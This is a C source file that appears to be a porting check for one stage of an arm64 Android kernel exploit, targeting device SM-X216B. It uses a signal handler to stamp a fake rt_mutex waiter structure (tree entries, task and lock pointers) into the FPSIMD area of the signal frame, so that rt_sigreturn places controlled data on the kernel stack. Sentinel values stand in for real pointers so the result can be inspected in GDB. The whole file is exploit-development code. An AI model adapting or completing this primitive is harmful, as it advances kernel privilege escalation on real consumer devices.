#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <errno.h>
#include <pthread.h>
#include <stdatomic.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <asm/sigcontext.h>

#ifndef FPSIMD_MAGIC
#define FPSIMD_MAGIC 0x46508001ULL
#endif

#define SIGRETURN_FPSIMD_WAITER_OFF 0x148
#define FAKE_WAITER_SIZE 0x50

#define SENTINEL_TREE   0xAA11AA11AA11AA11ULL
#define SENTINEL_PI     0xBB22BB22BB22BB22ULL
#define SENTINEL_TASK   0xCC33CC33CC33CC33ULL
#define SENTINEL_LOCK   0xDD44DD44DD44DD44ULL

struct k_fpsimd_context {
    uint32_t magic;
    uint32_t size;
    uint32_t fpsr;
    uint32_t fpcr;
    uint8_t  vregs[32 * 16];
};

static atomic_int g_sig_done = 0;
static atomic_int g_sig_status = 0;
static atomic_int g_thread_ready = 0;
static atomic_int g_test_complete = 0;

static void sigreturn_handler(int sig, siginfo_t *info, void *ucontext) {
    (void)sig; (void)info;
    ucontext_t *ctx = (ucontext_t *)ucontext;
    unsigned char *cur = (unsigned char *)ctx->uc_mcontext.__reserved;
    unsigned char *end = cur + sizeof(ctx->uc_mcontext.__reserved);
    int status = -1;

    while ((size_t)(end - cur) >= 8) {
        uint32_t magic = *(const uint32_t *)cur;
        uint32_t size  = *(const uint32_t *)(cur + 4);

        if (magic == 0 && size == 0) break;
        if (size < 8 || (size & 15) || (size_t)(end - cur) < size) break;

        if (magic == FPSIMD_MAGIC) {
            struct k_fpsimd_context *fpsimd = (struct k_fpsimd_context *)cur;
            unsigned char *dst = (unsigned char *)fpsimd->vregs + SIGRETURN_FPSIMD_WAITER_OFF;
            uint64_t *w = (uint64_t *)dst;

            /* Stamp test sentinels at exact waiter offsets */
            w[0x00 / 8] = SENTINEL_TREE;               /* tree_entry */
            w[0x08 / 8] = 0;
            w[0x10 / 8] = 0;
            w[0x18 / 8] = SENTINEL_PI;                 /* pi_tree_entry */
            w[0x20 / 8] = 0;
            w[0x28 / 8] = 0;
            w[0x30 / 8] = SENTINEL_TASK;               /* task pointer */
            w[0x38 / 8] = SENTINEL_LOCK;               /* lock pointer */
            w[0x40 / 8] = 0x0000000300000000ULL;       /* wake_state / prio */
            w[0x48 / 8] = 0;                           /* deadline */

            status = 1;
            break;
        }
        cur += size;
    }

    atomic_store_explicit(&g_sig_status, status, memory_order_relaxed);
    atomic_store_explicit(&g_sig_done, 1, memory_order_release);
}

static void *target_thread_fn(void *arg) {
    (void)arg;
    int tid = (int)syscall(SYS_gettid);
    printf("[+] Target thread started (TID=%d)\n", tid);
    fflush(stdout);

    /* Signal main thread that target is ready */
    atomic_store(&g_thread_ready, tid);

    /* Wait for signal delivery and rt_sigreturn completion */
    while (!atomic_load_explicit(&g_sig_done, memory_order_acquire)) {
        __asm__ volatile("yield" ::: "memory");
    }

    printf("[+] Target thread: sigreturn completed with status=%d\n",
           atomic_load(&g_sig_status));
    fflush(stdout);

    /* Spin in zero-syscall loop to preserve kernel stack frame for GDB/analysis */
    while (!atomic_load(&g_test_complete)) {
        __asm__ volatile("yield" ::: "memory");
    }

    return NULL;
}

#include <sys/mount.h>
#include <sys/stat.h>

int main(void) {
    /* Mount kernel filesystems if running as PID 1 */
    mkdir("/dev", 0755);
    mkdir("/proc", 0755);
    mkdir("/sys", 0755);
    mount("devtmpfs", "/dev", "devtmpfs", 0, NULL);
    mount("proc", "/proc", "proc", 0, NULL);
    mount("sysfs", "/sys", "sysfs", 0, NULL);

    printf("=================================================================\n");
    printf("[*] Sigreturn FPSIMD Carrier Porting Verification (SM-X216B)\n");
    printf("[*] Configured Offset: 0x%x (%d bytes)\n",
           SIGRETURN_FPSIMD_WAITER_OFF, SIGRETURN_FPSIMD_WAITER_OFF);
    printf("=================================================================\n");

    /* Install signal handler */
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_sigaction = sigreturn_handler;
    sa.sa_flags = SA_SIGINFO | SA_RESTART;
    sigemptyset(&sa.sa_mask);

    if (sigaction(SIGUSR2, &sa, NULL) != 0) {
        perror("[-] sigaction failed");
        return 1;
    }
    printf("[+] SIGUSR2 handler registered with SA_SIGINFO\n");

    /* Create target thread */
    pthread_t thread;
    if (pthread_create(&thread, NULL, target_thread_fn, NULL) != 0) {
        perror("[-] pthread_create failed");
        return 1;
    }

    /* Wait for target thread TID */
    int target_tid = 0;
    while ((target_tid = atomic_load(&g_thread_ready)) == 0) {
        usleep(1000);
    }

    usleep(10000);
    printf("[+] Dispatching SIGUSR2 to TID %d...\n", target_tid);

    siginfo_t info;
    memset(&info, 0, sizeof(info));
    info.si_signo = SIGUSR2;
    info.si_code = SI_QUEUE;
    info.si_pid = getpid();
    info.si_uid = getuid();

    int ret = (int)syscall(SYS_rt_tgsigqueueinfo, getpid(), target_tid, SIGUSR2, &info);
    if (ret != 0) {
        perror("[-] SYS_rt_tgsigqueueinfo failed");
        return 1;
    }

    /* Wait for signal handler to run */
    while (!atomic_load(&g_sig_done)) {
        usleep(1000);
    }

    printf("[+] Signal dispatched and processed successfully.\n");
    printf("[+] Waiting 3 seconds for GDB inspection...\n");
    sleep(3);

    atomic_store(&g_test_complete, 1);
    pthread_join(thread, NULL);

    printf("[+] Test completed cleanly.\n");
    return 0;
}
